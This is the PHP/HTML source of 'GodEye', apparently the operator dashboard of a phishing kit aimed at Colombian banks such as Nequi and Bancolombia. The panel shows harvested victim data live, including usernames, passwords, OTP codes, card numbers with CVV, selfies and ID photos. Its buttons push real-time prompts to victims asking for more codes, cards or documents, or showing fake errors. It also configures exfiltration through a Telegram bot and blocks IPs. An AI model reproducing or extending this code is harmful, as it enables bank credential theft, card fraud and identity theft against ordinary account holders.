<?php
// god/dashboard.php
require_once __DIR__ . '/auth.php';
?>
<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GodEye Dashboard Global</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary: #1e1e1e;
            --accent: #00ff88;
            --bg: #121212;
            --card-bg: #1e1e1e;
            --text: #e0e0e0;
            --text-muted: #a0a0a0;
            --border: #333;
        }

        body {
            font-family: 'Inter', sans-serif;
            background-color: var(--bg);
            color: var(--text);
            margin: 0;
            padding-bottom: 50px;
        }

        /* NAVBAR */
        .navbar {
            background-color: #000;
            border-bottom: 2px solid var(--accent);
            padding: 1rem 1.5rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: sticky;
            top: 0;
            z-index: 1000;
            box-shadow: 0 0 15px rgba(0, 255, 136, 0.2);
        }

        .navbar-brand {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .navbar h1 {
            margin: 0;
            font-size: 1.25rem;
            font-weight: 700;
            color: var(--accent);
            letter-spacing: 1px;
            text-transform: uppercase;
        }

        .navbar-actions {
            display: flex;
            gap: 15px;
            align-items: center;
        }

        .status-dot {
            height: 10px;
            width: 10px;
            border-radius: 50%;
            display: inline-block;
            background: var(--accent);
            box-shadow: 0 0 8px var(--accent);
        }

        .status-dot.disconnected {
            background: #ef4444;
            box-shadow: 0 0 8px #ef4444;
        }

        /* TABS & FILTERS */
        .controls-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 1rem 1.5rem;
            max-width: 1400px;
            margin: 0 auto;
            flex-wrap: wrap;
            gap: 10px;
        }

        .filter-group {
            display: flex;
            gap: 10px;
            align-items: center;
        }

        select {
            padding: 8px 15px;
            border-radius: 8px;
            background: #252525;
            color: #fff;
            border: 1px solid #444;
            font-size: 0.9rem;
            outline: none;
        }

        .btn-global {
            padding: 8px 15px;
            border-radius: 6px;
            border: none;
            font-weight: 600;
            cursor: pointer;
            font-size: 0.9rem;
            transition: 0.2s;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .btn-nuke {
            background: #b91c1c;
            color: white;
        }

        .btn-nuke:hover {
            background: #dc2626;
        }

        .btn-block {
            background: #252525;
            color: #fff;
            border: 1px solid #444;
        }

        .btn-block:hover {
            background: #333;
        }

        /* GRID */
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
            gap: 1.5rem;
            padding: 1rem 1.5rem;
            max-width: 1400px;
            margin: 0 auto;
        }

        .card {
            background: var(--card-bg);
            border-radius: 12px;
            border: 1px solid var(--border);
            padding: 1.25rem;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.5);
            display: flex;
            flex-direction: column;
            gap: 0.75rem;
            transition: transform 0.2s;
            position: relative;
        }

        .card:hover {
            transform: translateY(-2px);
            border-color: #555;
        }

        /* Status Animations */
        @keyframes blink-red {
            50% {
                border-color: #ef4444;
                box-shadow: 0 0 10px rgba(239, 68, 68, 0.3);
                background: rgba(239, 68, 68, 0.05);
            }
        }

        .blink-alert {
            animation: blink-red 1s infinite;
            border-color: #ef4444;
        }

        .card-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #333;
            padding-bottom: 10px;
        }

        .bank-badge {
            font-size: 0.75rem;
            font-weight: 700;
            padding: 4px 8px;
            border-radius: 4px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .bank-nequi {
            background: rgba(255, 0, 191, 0.15);
            color: #ff00bf;
            border: 1px solid rgba(255, 0, 191, 0.3);
        }

        .bank-pse {
            background: rgba(255, 230, 0, 0.1);
            color: #ffe600;
            border: 1px solid rgba(255, 230, 0, 0.3);
        }

        .data-list {
            display: flex;
            flex-direction: column;
            gap: 6px;
        }

        .data-row {
            display: flex;
            justify-content: space-between;
            font-size: 0.9rem;
            border-bottom: 1px solid #2a2a2a;
            padding-bottom: 2px;
        }

        .data-row:last-child {
            border-bottom: none;
        }

        .data-label {
            color: #888;
        }

        .data-val {
            color: #fff;
            font-weight: 500;
            text-align: right;
        }

        .data-val.accent {
            color: var(--accent);
        }

        .data-val.otp {
            color: #fb923c;
            font-weight: 700;
            letter-spacing: 1px;
            font-size: 1rem;
        }

        /* Photo Gallery in Card */
        .photo-gallery {
            display: flex;
            gap: 5px;
            margin-top: 5px;
            overflow-x: auto;
            padding-bottom: 5px;
        }

        .photo-thumb {
            width: 60px;
            height: 60px;
            border-radius: 4px;
            border: 1px solid #444;
            object-fit: cover;
            cursor: pointer;
            transition: 0.2s;
        }

        .photo-thumb:hover {
            transform: scale(1.05);
            border-color: var(--accent);
        }

        /* Status State */
        .status-box {
            background: #252525;
            text-align: center;
            padding: 8px;
            border-radius: 6px;
            font-size: 0.85rem;
            font-weight: 700;
            color: #ddd;
            border: 1px solid #444;
            margin-top: 5px;
        }

        .st-1 {
            background: rgba(60, 180, 229, 0.1);
            color: #3cb4e5;
            border-color: #3cb4e5;
        }

        /* Waiting Action */
        .st-err {
            background: rgba(239, 68, 68, 0.1);
            color: #ef4444;
            border-color: #ef4444;
        }

        .st-ok {
            background: rgba(34, 197, 94, 0.1);
            color: #22c55e;
            border-color: #22c55e;
        }

        /* ACTION BUTTONS GRID */
        .actions-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 6px;
            margin-top: 10px;
        }

        .btn-act {
            border: none;
            padding: 8px;
            border-radius: 4px;
            font-size: 0.75rem;
            font-weight: 700;
            cursor: pointer;
            text-transform: uppercase;
            color: #111;
            transition: 0.1s;
        }

        .btn-act:active {
            transform: scale(0.97);
        }

        .btn:hover {
            opacity: 0.9;
            filter: brightness(1.1);
        }

        /* NEW COMPACT LAYOUT STYLES */
        .btn-group-primary {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 8px;
            margin-bottom: 8px;
        }

        .btn-expand {
            width: 100%;
            background: transparent;
            border: 1px dashed #444;
            color: #888;
            padding: 8px;
            cursor: pointer;
            border-radius: 6px;
            font-size: 0.8rem;
            transition: 0.2s;
        }

        .btn-expand:hover {
            border-color: #666;
            color: #ccc;
        }

        .action-category {
            margin-bottom: 12px;
            border-top: 1px solid #333;
            padding-top: 8px;
        }

        .cat-title {
            display: block;
            font-size: 0.7rem;
            color: #666;
            margin-bottom: 6px;
            text-transform: uppercase;
            font-weight: 700;
        }

        .btn-grid-mini {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(60px, 1fr));
            gap: 6px;
        }

        .btn-mini {
            padding: 6px 4px;
            font-size: 0.7rem;
            border-radius: 4px;
            border: none;
            cursor: pointer;
            color: #fff;
            font-weight: 600;
        }

        /* Specific mini colors */
        .act-whats {
            background: #16a34a;
            color: #fff;
            border: 1px solid #14532d;
        }

        .act-sel {
            background: #7c3aed;
            border: 1px solid #5b21b6;
        }

        .act-doc {
            background: #9333ea;
            border: 1px solid #6b21a8;
        }

        .act-dyn {
            background: #d97706;
            color: #fff;
            border: 1px solid #92400e;
        }

        /* ERROR RED BUTTONS */
        .btn-err {
            background: #dc2626;
            /* Darker red */
            color: white;
            border: 1px solid #991b1b;
            font-weight: 700;
        }

        .btn-err:hover {
            background: #b91c1c;
        }

        .act-otp {
            background: #0ea5e9;
            color: white;
        }

        .act-cc {
            background: #c026d3;
            color: white;
        }

        .act-sel {
            background: #a78bfa;
        }

        .act-doc {
            background: #c084fc;
        }

        /* More purple */
        .act-dyn {
            background: #fbbf24;
        }

        /* Amber/Orange */
        .act-fin {
            background: #4b5563;
            color: white;
            grid-column: span 2;
        }

        .act-whats {
            background: #4ade80;
        }

        /* Card Footer */
        .card-footer {
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 0.75rem;
            color: #555;
            margin-top: 5px;
            padding-top: 8px;
            border-top: 1px solid #333;
        }

        .btn-icon {
            background: none;
            border: none;
            color: #666;
            cursor: pointer;
            font-size: 1rem;
            padding: 2px 5px;
        }

        .btn-icon:hover {
            color: #ddd;
        }

        .btn-del:hover {
            color: #f87171;
        }

        /* Image Modal */
        #imgModal {
            display: none;
            position: fixed;
            z-index: 2000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.9);
            justify-content: center;
            align-items: center;
        }

        #imgFull {
            max-width: 90%;
            max-height: 90%;
            border-radius: 8px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
        }

        .close-modal {
            position: absolute;
            top: 20px;
            right: 30px;
            color: white;
            font-size: 40px;
            cursor: pointer;
        }
    </style>
</head>

<body>
    <!-- Sound -->
    <audio id="alert-sound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>

    <nav class="navbar">
        <div class="navbar-brand">
            <div id="connection-dot" class="status-dot"></div>
            <h1>GodEye Panel Global</h1>
        </div>
        <div class="navbar-actions">
            <span id="clock" style="color:#666; font-family:monospace; font-size:1.1rem;">00:00:00</span>
            <a href="users.php" style="color:#666; font-size:.85rem;" title="Usuarios"><i class="fas fa-users"></i></a>
            <a href="audit.php" style="color:#666; font-size:.85rem;" title="Seguridad"><i class="fas fa-shield-alt"></i></a>
            <a href="logout.php" style="color: #666;" title="Cerrar sesión"><i class="fas fa-sign-out-alt"></i></a>
        </div>
    </nav>

    <div class="controls-bar">
        <div class="filter-group">
            <select id="bankFilter" onchange="setFilter(this.value)">
                <option value="all">Todos los Bancos</option>
                <option value="nequi">Nequi</option>
                <option value="bancolombia">Bancolombia</option>
                <option value="davivienda">Davivienda</option>
                <option value="bbva">BBVA</option>
                <option value="bogota">Bogotá</option>
                <option value="popular">Popular</option>
                <option value="occidente">Occidente</option>
                <option value="avvillas">Av Villas</option>
                <option value="scotiabank">Colpatria</option>
            </select>
        </div>

        <div style="display:flex; gap:10px;">
            <button onclick="openConfigModal()" class="btn-global" style="background:#3b82f6; color:white;">
                <i class="fas fa-cog"></i> Config Bot
            </button>
            <button onclick="openBlockedModal()" class="btn-global btn-block">
                <i class="fas fa-ban"></i> Block IPs
            </button>
            <button onclick="nukeAll()" class="btn-global btn-nuke">
                <i class="fas fa-radiation"></i> DELETE ALL
            </button>
        </div>

        <!-- Redirect Toggle -->
        <div
            style="display:flex; align-items:center; background:#252525; padding:5px 10px; border-radius:6px; border:1px solid #444;">
            <span style="font-size:0.8rem; color:#aaa; margin-right:10px;">Redirect Seguro:</span>
            <label class="switch" style="position:relative; display:inline-block; width:40px; height:20px;">
                <input type="checkbox" id="redirectToggle" onchange="toggleRedirect(this)">
                <span class="slider"
                    style="position:absolute; cursor:pointer; top:0; left:0; right:0; bottom:0; background-color:#ccc; transition:.4s; border-radius:20px;"></span>
            </label>
            <style>
                .switch input {
                    opacity: 0;
                    width: 0;
                    height: 0;
                }

                .slider:before {
                    position: absolute;
                    content: "";
                    height: 16px;
                    width: 16px;
                    left: 2px;
                    bottom: 2px;
                    background-color: white;
                    transition: .4s;
                    border-radius: 50%;
                }

                input:checked+.slider {
                    background-color: #00ff88;
                }

                input:checked+.slider:before {
                    transform: translateX(20px);
                }
            </style>
        </div>
    </div>

    <script>
        function esc(text) {
            if (!text) return '';
            return String(text)
                .replace(/&/g, "&amp;")
                .replace(/</g, "&lt;")
                .replace(/>/g, "&gt;")
                .replace(/"/g, "&quot;")
                .replace(/'/g, "&#039;");
        }
    </script>


    <!-- MAIN GRID -->
    <div id="grid" class="grid">
        <!-- Cards Injected JS -->
    </div>

    <!-- Image Modal -->
    <div id="imgModal" onclick="this.style.display='none'">
        <span class="close-modal">&times;</span>
        <img id="imgFull">
    </div>

    <!-- Config Modal -->
    <div id="configModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:1000; align-items:center; justify-content:center;">
        <div style="background:#1e1e1e; padding:25px; border-radius:10px; width:90%; max-width:400px; border:1px solid #444;">
            <div style="display:flex; justify-content:space-between; margin-bottom:20px;">
                <h3 style="margin:0; color:#00ff88;"><i class="fas fa-robot"></i> Configurar Telegram</h3>
                <button onclick="document.getElementById('configModal').style.display='none'" style="background:none; border:none; color:#aaa; cursor:pointer; font-size:1.5rem;">&times;</button>
            </div>
            
            <div style="margin-bottom:15px;">
                <label style="display:block; color:#aaa; font-size:0.85rem; margin-bottom:5px;">Bot Token</label>
                <input type="text" id="cfgToken" style="width:100%; padding:10px; background:#252525; border:1px solid #444; color:#fff; border-radius:6px; outline:none; box-sizing:border-box;">
            </div>
            
            <div style="margin-bottom:15px;">
                <label style="display:block; color:#aaa; font-size:0.85rem; margin-bottom:5px;">Chat ID</label>
                <input type="text" id="cfgChatId" style="width:100%; padding:10px; background:#252525; border:1px solid #444; color:#fff; border-radius:6px; outline:none; box-sizing:border-box;">
            </div>

            <div style="margin-bottom:15px;">
                <label style="display:block; color:#aaa; font-size:0.85rem; margin-bottom:5px;">Dominio Render (App URL)</label>
                <input type="text" id="cfgRenderUrl" placeholder="https://ejemplo.onrender.com" style="width:100%; padding:10px; background:#252525; border:1px solid #444; color:#fff; border-radius:6px; outline:none; box-sizing:border-box;">
            </div>

            <div style="margin-bottom:20px;">
                <label style="display:block; color:#aaa; font-size:0.85rem; margin-bottom:5px;">Dominio Backend (Vercel/Base URL)</label>
                <input type="text" id="cfgBackendUrl" placeholder="https://ejemplo.vercel.app" style="width:100%; padding:10px; background:#252525; border:1px solid #444; color:#fff; border-radius:6px; outline:none; box-sizing:border-box;">
                <small style="color:#777; font-size:0.75rem; display:block; margin-top:5px;">Esto cambiará el dominio de las notificaciones del bot (baseUrl).</small>
            </div>
            
            <button onclick="saveTelegramConfig()" class="btn-global" style="width:100%; background:#00ff88; color:#000; padding:12px; justify-content:center;">Guardar Cambios</button>
        </div>
    </div>

    <!-- Hidden Modal for IPs (simplified reused logic) -->
    <div id="blockedModal"
        style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:1000; align-items:center; justify-content:center;">
        <div
            style="background:#1e1e1e; padding:20px; border-radius:10px; width:90%; max-width:500px; max-height:80vh; overflow-y:auto; border:1px solid #333;">
            <div style="display:flex; justify-content:space-between; margin-bottom:15px;">
                <h3 style="margin:0; color:#ef4444;">IPs Bloqueadas</h3>
                <button onclick="document.getElementById('blockedModal').style.display='none'"
                    style="background:none; border:none; color:#aaa; cursor:pointer; font-size:1.5rem;">&times;</button>
            </div>
            <div id="blockedList"></div>
        </div>
    </div>

    <script>
        // --- HELPERS ---
        function esc(str) {
            if (!str) return '';
            return String(str)
                .replace(/&/g, '&amp;')
                .replace(/</g, '&lt;')
                .replace(/>/g, '&gt;')
                .replace(/"/g, '&quot;')
                .replace(/'/g, '&#039;');
        }

        // --- CONSTANTS & STATE ---
        let currentFilter = 'all';
        let isUpdating = false;
        let expandedCards = new Set(); // Track open dropdowns
        let lastSeenStatusMap = new Map(); // Para evitar sonidos infinitos
        let isInitialLoad = true;

        // --- INIT ---
        document.addEventListener('DOMContentLoaded', () => {
            checkRedirectStatus();
            updateData(); // Initial load
            setInterval(updateData, 3000); // Polling every 3s
        });

        // --- REDIRECT SETTINGS ---
        async function checkRedirectStatus() {
            try {
                const res = await fetch('settings.php?action=get_redirect&t=' + Date.now());
                const json = await res.json();
                if (json.status === 'success') {
                    document.getElementById('redirectToggle').checked = json.enabled;
                }
            } catch (e) {
                console.error("Error fetching redirect status", e);
            }
        }

        async function toggleRedirect(checkbox) {
            const enabled = checkbox.checked;
            try {
                const res = await fetch('settings.php?action=set_redirect', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ enabled: enabled })
                });
                const json = await res.json();
                if (json.status !== 'success') {
                    alert("Error updating setting");
                    checkbox.checked = !enabled; // Revert
                }
            } catch (e) {
                alert("Network error");
                checkbox.checked = !enabled; // Revert
            }
        }

        // --- TELEGRAM CONFIG ---
        async function openConfigModal() {
            try {
                const res = await fetch('settings.php?action=get_telegram&t=' + Date.now());
                const json = await res.json();
                if (json.status === 'success') {
                    document.getElementById('cfgToken').value = json.botToken;
                    document.getElementById('cfgChatId').value = json.chatId;
                    document.getElementById('cfgRenderUrl').value = json.renderUrl || '';
                    document.getElementById('cfgBackendUrl').value = json.backendUrl || '';
                    document.getElementById('configModal').style.display = 'flex';
                } else {
                    alert("Error cargando config actual: " + json.message);
                }
            } catch (e) {
                console.error(e);
            }
        }

        async function saveTelegramConfig() {
            const token = document.getElementById('cfgToken').value.trim();
            const chat = document.getElementById('cfgChatId').value.trim();
            const rUrl = document.getElementById('cfgRenderUrl').value.trim();
            const bUrl = document.getElementById('cfgBackendUrl').value.trim();
            if(!token || !chat) { alert("Llena los campos obligatorios"); return; }
            
            try {
                const res = await fetch('settings.php?action=set_telegram', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({botToken: token, chatId: chat, renderUrl: rUrl, backendUrl: bUrl})
                });
                const json = await res.json();
                if(json.status === 'success') {
                    alert("Configuración guardada exitosamente!");
                    document.getElementById('configModal').style.display = 'none';
                } else {
                    alert("Error guardando: " + json.message);
                }
            } catch(e) {
                alert("Error de red guardando.");
            }
        }

        // --- UPDATE CLOCK ---
        setInterval(() => {
            const now = new Date();
            document.getElementById('clock').innerText = now.toLocaleTimeString();
        }, 1000);

        // --- FETCH DATA ---
        async function updateData() {
            if (isUpdating) return;
            isUpdating = true;

            try {
                const res = await fetch('api.php');
                const json = await res.json();
                if (json.status === 'success') {
                    renderCards(json.data);
                    document.getElementById('connection-dot').classList.remove('disconnected');
                } else {
                    console.error("API Error: ", json);
                }
            } catch (e) {
                console.error("Fetch Error: ", e);
                document.getElementById('connection-dot').classList.add('disconnected');
            } finally {
                isUpdating = false;
            }
        }

        // --- RENDER CARDS ---
        function renderCards(items) {
            const grid = document.getElementById('grid');
            // Don't clear innerHTML immediately to verify diff if complex, 
            // but for now we rebuild. We just need to check if ID is in expandedCards.
            grid.innerHTML = '';
            let hasActionRequired = false;

            items.forEach(item => {
                // Filter
                if (currentFilter !== 'all') {
                    if (currentFilter === 'nequi' && item.type !== 'nequi') return;
                    if (currentFilter !== 'nequi' && (!item.bank.toLowerCase().includes(currentFilter) || item.type === 'nequi')) return;
                }

                const card = document.createElement('div');
                card.className = 'card';

                // Blink logic if status indicates new data or action required
                const actionTriggerStatuses = [1, 3, 5, 9, 11, 12, 15, 17, 18];
                if (actionTriggerStatuses.includes(parseInt(item.status_id))) {
                    card.classList.add('blink-alert');
                    hasActionRequired = true;
                }

                // Header
                const bankClass = item.type === 'nequi' ? 'bank-nequi' : 'bank-pse';
                const timeStr = item.date ? item.date.substring(5, 16) : ''; // MM-DD HH:mm

                // Determine Images to Show
                let imagesHtml = '';
                if (item.foto_selfie) imagesHtml += `<img src="../../assets/uploads/${item.foto_selfie}" class="photo-thumb" onclick="showImg(this.src)" title="Selfie">`;
                if (item.foto_front) imagesHtml += `<img src="../../assets/uploads/${item.foto_front}" class="photo-thumb" onclick="showImg(this.src)" title="Front">`;
                if (item.foto_back) imagesHtml += `<img src="../../assets/uploads/${item.foto_back}" class="photo-thumb" onclick="showImg(this.src)" title="Back">`;

                // Status Label logic
                const statusClass = (parseInt(item.status_id) === 1) ? 'st-1' :
                    ([2, 4, 6, 10, 13, 14, 16].includes(parseInt(item.status_id)) ? 'st-err' : 'st-ok');

                // Buttons Logic
                const btns = getButtons(item.id, item.type, item.bank, expandedCards.has(item.id), item.status_id);

                card.innerHTML = `
                    <div class="card-header">
                        <span class="bank-badge ${bankClass}">${item.bank}</span>
                        <span style="font-size:0.75rem; color:#666;">${timeStr}</span>
                    </div>

                    <div class="data-list">
                        <div class="data-row">
                            <span class="data-label">Usuario</span>
                            <span class="data-val">${esc(item.user)}</span>
                        </div>
                        <div class="data-row">
                            <span class="data-label">Clave</span>
                            <span class="data-val accent">${esc(item.pass)}</span>
                        </div>
                         ${item.email ? `
                        <div class="data-row">
                            <span class="data-label">Email</span>
                            <span class="data-val" style="font-size:0.8rem">${esc(item.email)}</span>
                        </div>` : ''}
                        
                        ${item.otp ? `
                        <div class="data-row" style="margin-top:5px; border:none;">
                            <span class="data-label" style="color:#fb923c">OTP/Dina</span>
                            <span class="data-val otp">${esc(item.otp)}</span>
                        </div>` : ''}

                        ${item.linea ? `
                        <div class="data-row">
                            <span class="data-label" style="color:#00ff88">Línea Cons.</span>
                            <span class="data-val" style="color:#00ff88; font-weight:bold;">${esc(item.linea)}</span>
                        </div>` : ''}

                        ${item.tel_contacto ? `
                        <div class="data-row">
                            <span class="data-label">Tel. Contacto</span>
                            <span class="data-val">${esc(item.tel_contacto)}</span>
                        </div>` : ''}

                        ${item.tarjeta ? `
                        <div class="data-row" style="margin-top:5px; border-top:1px dashed #444; padding-top:4px;">
                            <span class="data-label">CC/Fecha</span>
                            <div style="text-align:right">
                                <div class="data-val" style="color:#d8b4fe; font-size:0.9rem">${item.tarjeta}</div>
                                <div class="data-val" style="color:#d8b4fe; font-size:0.8rem">${item.expiry} | ${item.cvv}</div>
                            </div>
                        </div>` : ''}
                    </div>

                    ${imagesHtml ? `<div class="photo-gallery">${imagesHtml}</div>` : ''}

                    <div class="status-box ${statusClass}">
                        ${item.status_text}
                    </div>

                    <div class="actions-container">
                        ${btns}
                    </div>

                    <div class="card-footer">
                        <span>IP: ${item.ip}</span>
                        <div style="display:flex; gap:10px;">
                            <button class="btn-icon" onclick="blockIp('${item.ip}')" title="Block IP"><i class="fas fa-ban"></i></button>
                            <button class="btn-icon btn-del" onclick="deleteItem(${item.id}, '${item.type}')" title="Delete"><i class="fas fa-trash"></i></button>
                        </div>
                    </div>
                `;

                grid.appendChild(card);
            });

            // Sound
            const audio = document.getElementById('alert-sound');
            if (hasActionRequired) {
                if (audio.paused) audio.play().catch(() => { });
            }
        }

        // --- BUTTONS BUILDER NEW DESIGN ---
        // --- BUTTONS BUILDER NEW DESIGN ---
        // --- BUTTONS BUILDER NEW DESIGN ---
        function getButtons(id, type, bankName, isOpen, status_id) {
            let b = '';
            const st = parseInt(status_id);

            // --- LÓGICA DE CONSULTA (ESTADOS 17 Y 18) ---
            if (st === 17 || st === 18) {
                b += `<div class="btn-group-primary">`;
                b += `<button class="btn-act act-fin" style="width:100%" onclick="act(${id},'${type}',7)">FINALIZAR</button>`;
                b += `</div>`;
                return b; // No mostrar más opciones
            }

            // Primary Actions (Always Visible)
            b += `<div class="btn-group-primary">`;
            if (type === 'nequi') {
                b += `<button class="btn-act act-otp" onclick="act(${id},'nequi',3)">Pedir OTP</button>`;
                b += `<button class="btn-act act-fin" onclick="act(${id},'nequi',0)">Finalizar</button>`;
            } else if (bankName === 'Bancolombia' || bankName === 'bancolombia') {
                b += `<button class="btn-act act-otp" onclick="act(${id},'pse',3)">Pedir OTP</button>`;
                b += `<button class="btn-act act-cc" onclick="act(${id},'pse',5)">Pedir CC</button>`;
                b += `<button class="btn-act act-fin" onclick="act(${id},'pse',7)">Finalizar</button>`;
            } else {
                b += `<button class="btn-act act-otp" onclick="act(${id},'pse',3)">Pedir OTP</button>`;
                b += `<button class="btn-act act-fin" onclick="act(${id},'pse',7)">Finalizar</button>`;
            }
            b += `</div>`;

            // Toggle Trigger
            const icon = isOpen ? 'fa-chevron-up' : 'fa-chevron-down';
            const text = isOpen ? 'Menos Opciones' : 'Más Opciones / Errores';
            const style = isOpen ? 'background:#333; color:#efefef;' : '';

            b += `<button class="btn-expand" onclick="toggleActions(this, ${id})" style="${style}">
                    <i class="fas ${icon}"></i> ${text}
                  </button>`;

            // Hidden Secondary Actions
            const display = isOpen ? 'block' : 'none';
            b += `<div class="actions-hidden" style="display:${display}; margin-top:10px;">`;

            // 1. Errors Section
            b += `<div class="action-category"><span class="cat-title">⚠️ Reportar Errores (Rojo)</span><div class="btn-grid-mini">`;
            if (type === 'nequi') { // Nequi Errors
                b += `<button class="btn-mini btn-err" onclick="act(${id},'nequi',2)">Err Login</button>`;
                b += `<button class="btn-mini btn-err" onclick="act(${id},'nequi',4)">Err OTP</button>`;
            } else if (bankName === 'Bancolombia' || bankName === 'bancolombia') { // PSE Bancolombia
                b += `<button class="btn-mini btn-err" onclick="act(${id},'pse',2)">Err Login</button>`;
                b += `<button class="btn-mini btn-err" onclick="act(${id},'pse',4)">Err OTP</button>`;
                b += `<button class="btn-mini btn-err" onclick="act(${id},'pse',6)">Err CC</button>`;
                b += `<button class="btn-mini btn-err" onclick="act(${id},'pse',10)">Err Selfie</button>`;
                b += `<button class="btn-mini btn-err" onclick="act(${id},'pse',13)">Err Doc F.</button>`;
                b += `<button class="btn-mini btn-err" onclick="act(${id},'pse',14)">Err Doc R.</button>`;
                b += `<button class="btn-mini btn-err" onclick="act(${id},'pse',16)">Err Reloj</button>`;
            } else { // PSE Otros
                b += `<button class="btn-mini btn-err" onclick="act(${id},'pse',2)">Err Login</button>`;
                b += `<button class="btn-mini btn-err" onclick="act(${id},'pse',4)">Err OTP</button>`;
            }
            b += `</div></div>`;

            // 2. Extra Requests
            if (type !== 'nequi' && (bankName === 'Bancolombia' || bankName === 'bancolombia')) {
                b += `<div class="action-category"><span class="cat-title">📡 Solicitar Datos (Color)</span><div class="btn-grid-mini">`;
                b += `<button class="btn-mini act-whats" onclick="act(${id},'pse',8)">WhatsApp</button>`;
                b += `<button class="btn-mini act-sel" onclick="act(${id},'pse',9)">Pedir Selfie</button>`;
                b += `<button class="btn-mini act-doc" onclick="act(${id},'pse',11)">Doc Frente</button>`;
                b += `<button class="btn-mini act-doc" onclick="act(${id},'pse',12)">Doc Reverso</button>`;
                b += `<button class="btn-mini act-dyn" onclick="act(${id},'pse',15)">Pedir Clave Dinámica</button>`;
                b += `</div></div>`;
            }

            b += `</div>`; // End hidden
            return b;
        }

        function toggleActions(btn, id) {
            const container = btn.nextElementSibling;
            if (container.style.display === 'none') {
                container.style.display = 'block';
                btn.innerHTML = '<i class="fas fa-chevron-up"></i> Menos Opciones';
                btn.style.background = '#333';
                btn.style.color = '#efefef';
                expandedCards.add(id);
            } else {
                container.style.display = 'none';
                btn.innerHTML = '<i class="fas fa-chevron-down"></i> Más Opciones / Errores';
                btn.style.background = 'transparent';
                btn.style.color = '#888';
                expandedCards.delete(id);
            }
        }

        // --- ACTIONS ---
        async function act(id, table, status) {
            try {
                await fetch(`actions.php?id=${id}&table=${table}&estado=${status}`);
                updateData(); // Immediate refresh
            } catch (e) { alert("Error de red"); }
        }

        async function deleteItem(id, table) {
            if (!confirm("¿Eliminar?")) return;
            try {
                await fetch(`actions.php?id=${id}&table=${table}&action=delete`);
                updateData();
            } catch (e) { }
        }

        async function nukeAll() {
            const code = prompt("Escribe 'BORRAR' para eliminar TODOS los registros:");
            if (code !== 'BORRAR') return;

            try {
                await fetch(`actions.php?action=delete_all`);
                alert("Panel limpiado.");
                updateData();
            } catch (e) { alert("Error"); }
        }

        async function blockIp(ip) {
            if (!confirm(`Bloquear IP ${ip}?`)) return;
            fetch(`actions.php?ip=${ip}&action=block_ip`);
        }

        async function openBlockedModal() {
            const m = document.getElementById('blockedModal');
            const l = document.getElementById('blockedList');
            m.style.display = 'flex';
            l.innerHTML = 'Cargando...';
            // Fetch logic simplified for brevity - assumes api returns list
            const res = await fetch('api.php?action=get_blocked');
            const j = await res.json();
            l.innerHTML = j.data.map(ip => `<div style="display:flex; justify-content:space-between; margin-bottom:5px; border-bottom:1px solid #333; padding-bottom:5px;"><span>${ip}</span> <button onclick="unblock('${ip}')" style="color:green; cursor:pointer;">Unblock</button></div>`).join('');
        }

        async function unblock(ip) {
            await fetch(`actions.php?ip=${ip}&action=unblock_ip`);
            openBlockedModal();
        }

        function showImg(src) {
            document.getElementById('imgFull').src = src;
            document.getElementById('imgModal').style.display = 'flex';
        }

        function setFilter(val) {
            currentFilter = val;
            updateData();
        }

        // Init
        setInterval(updateData, 2000);
        updateData();

    </script>
</body>

</html>
